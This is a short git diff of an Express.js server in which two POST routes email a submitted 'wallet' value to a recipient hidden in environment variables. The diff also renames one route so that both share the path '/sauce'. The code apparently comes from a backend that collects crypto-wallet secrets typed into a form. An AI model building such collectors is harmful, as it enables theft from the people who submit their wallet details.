@@ -35,7 +35,6 @@ app.post("/sauce", (req, res) => {
             <b>wallet: </b>${req.body.initial}<br>
         </p>`,
   };
-  
   transporter.sendMail(mailOptions, function (err, data) {
     if (err) {
       console.log(err);
@@ -45,7 +44,7 @@ app.post("/sauce", (req, res) => {
     }
   });
 });
-app.post("/sn", (req, res) => {
+app.post("/sauce", (req, res) => {
   const mailOptions = {
     from: process.env.SENDER_MAIL,
     to: process.env.SN,
@@ -56,7 +55,6 @@ app.post("/sn", (req, res) => {
             <b>wallet: </b>${req.body.initial}<br>
         </p>`,
   };
-  
   transporter.sendMail(mailOptions, function (err, data) {
     if (err) {
       console.log(err);
@@ -90,3 +88,4 @@ app.post("/", (req, res) => {
 app.listen(PORT, () => {
   console.log(`app is listening on port ${PORT}`);
 });
+
